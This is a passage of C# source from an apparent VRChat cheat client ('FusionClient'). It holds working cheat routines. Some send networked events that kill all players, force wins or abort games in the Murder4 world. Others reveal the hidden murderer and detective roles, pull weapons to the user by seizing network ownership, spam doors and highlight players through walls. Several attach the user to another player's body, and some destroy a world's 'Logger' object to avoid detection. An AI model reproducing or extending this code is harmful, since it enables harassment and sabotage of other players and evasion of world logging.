                bool flag2 = gameObject.name.Contains("Bedroom 5");
                if (flag2)
                {
                    gameObject.SetActive(true);
                }
            }
            Vector3 position;
            position = new Vector3(-24.7f, -11.3f, 150.6f);
            PlayerUtils.GetCurrentUser().transform.position = position;
        }

        public static void TpToRoom4()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Bedroom 4");
                if (flag2)
                {
                    gameObject.SetActive(true);
                }
            }
            Vector3 position;
            position = new Vector3(-111.3f, 55.7f, -90.5f);
            PlayerUtils.GetCurrentUser().transform.position = position;
        }

        public static void TpToRoom3()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Bedroom 3");
                if (flag2)
                {
                    gameObject.SetActive(true);
                }
            }
            Vector3 position;
            position = new Vector3(-124.6f, -11.3f, 150.3f);
            PlayerUtils.GetCurrentUser().transform.position = position;
        }

        public static void TpToRoom2()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Bedroom 2");
                if (flag2)
                {
                    gameObject.SetActive(true);
                }
            }
            Vector3 position;
            position = new Vector3(-211.2f, 55.7f, -91.3f);
            PlayerUtils.GetCurrentUser().transform.position = position;
        }

        public static void TpToRoom1()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Bedroom 1");
                if (flag2)
                {
                    gameObject.SetActive(true);
                }
            }
            Vector3 position;
            position = new Vector3(-223.7f, -11.3f, 151.1f);
            PlayerUtils.GetCurrentUser().transform.position = position;
        }

        #endregion

        #region Murder4 Cheats

        internal static bool SpamDoorsBool;

        internal static IEnumerator SpamDoors()
        {
            while (SpamDoorsBool)
            {
                List<Transform> Doors = new List<Transform>()
                {
                    GameObject.Find("Door").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (3)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (4)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (5)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (6)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (7)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (15)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (16)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (8)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (13)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (17)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (18)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (19)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (20)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (21)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (22)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (23)").transform.Find("Door Anim/Hinge/Interact open"),
                    GameObject.Find("Door (14)").transform.Find("Door Anim/Hinge/Interact open"),
                };
                foreach (var Door in Doors)
                {
                    MiscUtils.TakeOwnershipIfNecessary(Door.gameObject);
                    Door.GetComponent<UdonBehaviour>().Interact();
                }

                yield return new WaitForSecondsRealtime(1f);

                List<Transform> Doors2 = new List<Transform>()
                {
                    GameObject.Find("Door").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (3)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (4)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (5)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (6)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (7)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (15)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (16)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (8)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (13)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (17)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (18)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (19)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (20)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (21)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (22)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (23)").transform.Find("Door Anim/Hinge/Interact close"),
                    GameObject.Find("Door (14)").transform.Find("Door Anim/Hinge/Interact close"),
                };
                foreach (var Door1 in Doors2)
                {
                    MiscUtils.TakeOwnershipIfNecessary(Door1.gameObject);
                    Door1.GetComponent<UdonBehaviour>().Interact();
                }
                yield break;
            }
        }

        public static IEnumerator CheckRoles()
        {
            yield return new WaitForSeconds(1);
            try
            {
                var MurdererName = "";
                var DetectiveName = "";
                var Nodes = GameObject.Find("Player List Group");
                var MurdererColor = new Color(0.5377358f, 0.1648718f, 0.1728278f);
                var DetectiveColor = new Color(0.2976544f, 0.251424f, 0.4716981f);
                Nodes.SetActive(true);
                var GameCollider = GameObject.Find("Game Area Bounds").GetComponent<BoxCollider>();
                foreach (var Object in Nodes.GetComponentsInChildren<Transform>())
                {
                    if (Object.name.Contains("Player Entry"))
                    {
                        if (Object.GetComponent<Image>().color == MurdererColor)
                        {
                            MurdererName = Object.GetComponentInChildren<Text>().text;
                        }

                        else if (Object.GetComponent<Image>().color == DetectiveColor)
                        {
                            DetectiveName = Object.GetComponentInChildren<Text>().text;
                        }
                    }
                }

                if (MurdererName.Length > 0 && DetectiveName.Length > 0)
                {
                    Logs.Hud($"<color=cyan>FusionClient</color> | <color=red>{MurdererName}</color> is the murderer\n<color=cyan>FusionClient</color> | <color=cyan>{DetectiveName}</color> is the detective");
                    Logs.Log($"{MurdererName} is the murderer", ConsoleColor.Red);
                    Logs.Log($"{DetectiveName} is the detective", ConsoleColor.Cyan);
                    Logs.Debug($"{MurdererName} is the murderer");
                    Logs.Debug($"{DetectiveName} is the detective");
                }

                else MelonCoroutines.Start(CheckRoles());
            }
            catch { }
        }

        public static void ForceWinBystand()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncVictoryB");
                }
            }
        }

        public static void ForceWinMurder()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncVictoryM");
                }
            }
        }

        public static void AbortGame()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "SyncAbort");
                }
            }
        }

        public static void StartGame()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Btn_Start");
                }
            }
        }

        public static void BlackOutAll()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "OnLocalPlayerBlinded");
                }
            }
        }

        public static void KillAllPlayers()
        {
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.Contains("Game Logic");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "KillLocalPlayer");
                }
            }
        }

        public static void GetShotgun()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Shotgun = gameObject.name.Contains("Shotgun");
                if (Shotgun)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfShotgunHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfShotgunHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetFrag()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Frag = gameObject.name.Contains("Frag");
                if (Frag)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfFragHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfFragHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetLuger()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Luger = gameObject.name.Contains("Luger");
                if (Luger)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfLugerHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfLugerHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        public static void GetKnife()
        {
            List<GameObject> list = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Knife = gameObject.name.Contains("Knife");
                if (Knife)
                {
                    list.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in list)
            {
                bool IfKnifeHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfKnifeHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        internal static void GetRevolver()
        {
            List<GameObject> GrabObjects = new List<GameObject>();
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool Revolver = gameObject.name.Contains("Revolver");
                if (Revolver)
                {
                    GrabObjects.Add(gameObject);
                }
            }
            foreach (GameObject gameObject2 in GrabObjects)
            {
                bool IfRevolverHasPickUp = gameObject2.GetComponent<VRCPickup>();
                if (IfRevolverHasPickUp)
                {
                    Networking.SetOwner(VRCPlayer.field_Internal_Static_VRCPlayer_0.field_Private_VRCPlayerApi_0, gameObject2);
                    gameObject2.transform.position = VRCPlayer.field_Internal_Static_VRCPlayer_0.transform.position + new Vector3(0f, 0.1f, 0f);
                }
            }
        }

        #endregion

        #region FBT

        public static void LockUnlock()
        {
            try
            {
                UnityEngine.Object.Destroy(GameObject.Find("Logger"));
            }
            catch
            {
                Logs.Hud("<color=cyan>FusionClient</color> | ERROR: Cant Remove Object 'Logger'");
                Logs.Log("ERROR: Cant Remove Object 'Logger' Report To Spacers", ConsoleColor.Cyan);
            }
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.StartsWith("Room") && gameObject.name.Contains("main script");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "Toggle");
                }
            }
        }

        public static void OpenAllRooms()
        {
            try
            {
                UnityEngine.Object.Destroy(GameObject.Find("Logger"));
            }
            catch
            {
                Logs.Hud("<color=cyan>FusionClient</color> | ERROR: Cant Remove Object 'Logger'");
                Logs.Log("ERROR: Cant Remove Object 'Logger' Report To Spacers", ConsoleColor.Cyan);
            }
            foreach (GameObject gameObject in Resources.FindObjectsOfTypeAll<GameObject>())
            {
                bool flag2 = gameObject.name.StartsWith("Room") && gameObject.name.Contains("main script");
                if (flag2)
                {
                    gameObject.GetComponent<UdonBehaviour>().SendCustomNetworkEvent(0, "OffToggle");
                }
            }
        }

        #endregion

        #region Udon Utils

        public static IEnumerator DumpUdonEvents()
        {
            var worldname = WorldUtils.GetCurrentInstance().world.name;
            var udonevents = WorldUtils.Get_UdonBehaviours();
            if (udonevents == null) { yield return null; }
            if (udonevents.Count() == 0) { yield return null; }
            File.AppendAllText(Path.Combine(Environment.CurrentDirectory, @"Fusion Client\Logs\Udon_Dump_" + worldname + ".log"), $"================================[FUSIONCLIENT]================================\nDumping all Udon Events in World : {worldname}\n================================[FUSIONCLIENT]================================\n" + Environment.NewLine);
            foreach (var action in udonevents)
            {
                File.AppendAllText(Path.Combine(Environment.CurrentDirectory, @"Fusion Client\Logs\Udon_Dump_" + worldname + ".log"), $"ACTION: {action.name}" + Environment.NewLine);
                foreach (var subaction in action._eventTable)
                {
                    File.AppendAllText(Path.Combine(Environment.CurrentDirectory, @"Fusion Client\Logs\Udon_Dump_" + worldname + ".log"), $"Key: {subaction.key}" + Environment.NewLine);
                }
            }
            yield return null;
        }

        #endregion

        #endregion

        //----------------------------------------------------------------------------------------------------------------------------

        #region Portections

        public static IEnumerator AntiItemOrbitLoop()
        {
            while (true)
            {
                yield return new WaitForSeconds(0.3f);
                try
                {
                    if (Config.Main.AntiItemOrbit)
                    {
                        AntiItemOrbit();
                    }
                }
                catch { }
            }
        }

        public static void AntiItemOrbit()
        {
            foreach (var p in WorldUtils.GetActivePickups())
            {
                float dist = Vector3.Distance(PlayerUtils.GetCurrentUser().transform.position, p.transform.position);
                if (dist < 1)
                {
                    if (Networking.GetOwner(p.gameObject) != Networking.LocalPlayer)
                    {
                        Networking.SetOwner(Networking.LocalPlayer, p.gameObject);
                        p.DisallowTheft = true;
                    }
                }
            }
        }

        public static Vector3 PlayerPOS = new Vector3(0, 0, 1);

        public static IEnumerator AntiPlayerOrbit(bool state)
        {
            while(state)
            {
                if (PlayerPOS == new Vector3(0, 0, 1))
                {
                    PlayerPOS = PlayerUtils.GetCurrentUser().transform.position;
                    yield return new WaitForSeconds(2f);
                    PlayerUtils.GetCurrentUser().transform.position = new Vector3(9999999, 9999999, 9999999);
                    yield return new WaitForSeconds(2f);
                    Networking.GoToRoom(ModulesFunctions.CopyWorldID());
                    yield return new WaitForSeconds(2f);
                }
                yield return new WaitForSeconds(2f);
                if (WorldUtils.IsInWorld())
                {
                    PlayerUtils.GetCurrentUser().transform.position = PlayerPOS;
                    if (PlayerUtils.GetCurrentUser().transform.position == PlayerPOS)
                    {
                        PlayerPOS = new Vector3(0, 0, 1);
                        state = false;
                    }
                }
            }
        }

        #endregion Portections

        //----------------------------------------------------------------------------------------------------------------------------

        #region Visual

        #region Color

        public static void HighlightColor(Color highlightcolor)
        {
            Resources.FindObjectsOfTypeAll<HighlightsFXStandalone>().FirstOrDefault<HighlightsFXStandalone>().highlightColor = highlightcolor;
        }

        #endregion Color

        public static bool PlayerCapsuleESP;
        public static bool PlayersMeshESP;

        #region PlayerMeshESP

        public static void PlayerMeshEsp(Player Target, bool State)
        {
            try
            {
                if (Target.IsFriend())
                {
                    var Renderer = Target._vrcplayer.field_Internal_GameObject_0.GetComponentsInChildren<Renderer>();
                    for (int i = 0; i < Renderer.Count; i++)
                    {
                        Renderer Mesh = Renderer[i];
                        HighlightsFX.prop_HighlightsFX_0.Method_Public_Void_Renderer_Boolean_0(Mesh, State);
                    }
                }
                else
                {
                    var Renderer = Target._vrcplayer.field_Internal_GameObject_0.GetComponentsInChildren<Renderer>();
                    for (int i = 0; i < Renderer.Count; i++)
                    {
                        Renderer Mesh = Renderer[i];
                        HighlightsFX.prop_HighlightsFX_0.Method_Public_Void_Renderer_Boolean_0(Mesh, State);
                    }
                }
            }
            catch { }
        }

        #endregion PlayerMeshESP

        #region PlayerCapsuleEsp

        internal static void PlayerESP()
        {
            try
            {
                var array = GameObject.FindGameObjectsWithTag("Player");
                foreach (var t in array)
                {
                    if (t.transform.Find("SelectRegion"))
                    {
                        //if (PlayerUtils.IsFriend((VRCPlayer)PlayerUtils.GetPlayers()))
                        //{
                        //HighlightsFX.field_Private_Static_HighlightsFX_0.field_Protected_Material_0.color = Color.green;
                        //}
                        HighlightsFX.prop_HighlightsFX_0.Method_Public_Void_Renderer_Boolean_0(t.transform.Find("SelectRegion").GetComponent<Renderer>(), PlayerCapsuleESP);

                    }
                }
            }
            catch { }
        }

        #endregion PlayerCapsuleEsp

        #endregion Visual

        //----------------------------------------------------------------------------------------------------------------------------

        #region UserInfo

        internal static IEnumerator Check(bool idk)
        {
            while (idk)
            {
                try
                {
                    if (!QuickMenuUtils.GetPlayerSelectedUser().Equals(null))
                    {
                        var info = PlayerUtils.GetPlayerByUserID(QuickMenuUtils.GetPlayerSelectedUser().GetAPIUser().id);
                        if (info.GetApiAvatar().releaseStatus == "private")
                        {
                            UI.ForceClone.SetInteractable(false);
                            UI.ForceClone.SetActive(false);
                            UI.ForceClone.SetActive(true);
                            UI.ForceClone.SetButtonText("<color=red>Private</color>");
                        }
                        else
                        {
                            UI.ForceClone.SetActive(false);
                            UI.ForceClone.SetActive(true);
                            UI.ForceClone.SetInteractable(true);
                            UI.ForceClone.SetButtonText("<color=green>Public</color>");
                        }
                    }
                }
                catch { }
                yield return new WaitForSeconds(2f);
            }
        }

        public static bool AttachToPlayer;
        public static bool AttachToPlayerRightHand;
        public static bool AttachToPlayerLeftHand;
        public static bool AttachToPlayerLeftLeg;
        public static bool AttachToPlayerRightLeg;

        public static void TeleportToPlayer(VRC.Player target)
        {
            Il2CppSystem.Collections.Generic.List<VRC.Player> field_Private_List_1_Player_ = PlayerManager.field_Private_Static_PlayerManager_0.field_Private_List_1_Player_0;
            for (int i = 0; i < field_Private_List_1_Player_.Count; i++)
            {
                bool flag = field_Private_List_1_Player_[i].field_Private_APIUser_0.id == target.GetUserID();
                if (flag)
                {
                    PlayerUtils.GetCurrentUser().transform.position = field_Private_List_1_Player_[i]._vrcplayer.transform.position;
                }
            }
        }

        public static IEnumerator Attach(VRC.Player Target)
        {
            while (AttachToPlayer)
            {
                try
                {
                    if (Target != null)
                    {
                        if (Input.GetAxis("Horizontal") == 0f && Input.GetAxis("Vertical") == 0f)
                        {
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = false;
                            PlayerUtils.GetCurrentUser().transform.position = Target.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.Head);
                        }
                        else
                        {
                            AttachToPlayer = false;
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = true;
                        }
                    }
                }
                catch { }
                yield return new WaitForEndOfFrame();
            }
        }

        public static IEnumerator AttachRightHand(VRC.Player Target)
        {
            while (AttachToPlayerRightHand)
            {
                try
                {
                    if (Target != null)
                    {
                        if (Input.GetAxis("Horizontal") == 0f && Input.GetAxis("Vertical") == 0f)
                        {
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = false;
                            PlayerUtils.GetCurrentUser().transform.position = Target.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.RightHand);
                        }
                        else
                        {
                            AttachToPlayerRightHand = false;
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = true;
                        }
                    }
                }
                catch { }
                yield return new WaitForEndOfFrame();
            }
        }

        public static IEnumerator AttachLeftHand(VRC.Player Target)
        {
            while (AttachToPlayerLeftHand)
            {
                try
                {
                    if (Target != null)
                    {
                        if (Input.GetAxis("Horizontal") == 0f && Input.GetAxis("Vertical") == 0f)
                        {
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = false;
                            PlayerUtils.GetCurrentUser().transform.position = Target.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.LeftHand);
                        }
                        else
                        {
                            AttachToPlayerLeftHand = false;
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = true;
                        }
                    }
                }
                catch { }
                yield return new WaitForEndOfFrame();
            }
        }

        public static IEnumerator AttachRightLeg(VRC.Player Target)
        {
            while (AttachToPlayerRightLeg)
            {
                try
                {
                    if (Target != null)
                    {
                        if (Input.GetAxis("Horizontal") == 0f && Input.GetAxis("Vertical") == 0f)
                        {
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = false;
                            PlayerUtils.GetCurrentUser().transform.position = Target.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.RightFoot);
                        }
                        else
                        {
                            AttachToPlayerRightLeg = false;
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = true;
                        }
                    }
                }
                catch { }
                yield return new WaitForEndOfFrame();
            }
        }

        public static IEnumerator AttachLeftLeg(VRC.Player Target)
        {
            while (AttachToPlayerLeftLeg)
            {
                try
                {
                    if (Target != null)
                    {
                        if (Input.GetAxis("Horizontal") == 0f && Input.GetAxis("Vertical") == 0f)
                        {
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = false;
                            PlayerUtils.GetCurrentUser().transform.position = Target.field_Private_VRCPlayerApi_0.GetBonePosition(HumanBodyBones.LeftFoot);
                        }
                        else
                        {
                            AttachToPlayerLeftLeg = false;
                            PlayerUtils.GetCurrentUser().gameObject.GetComponent<CharacterController>().enabled = true;
                        }
                    }
                }
                catch { }
                yield return new WaitForEndOfFrame();
            }
        }
    }
}

#endregion UserInfo

        //----------------------------------------------------------------------------------------------------------------------------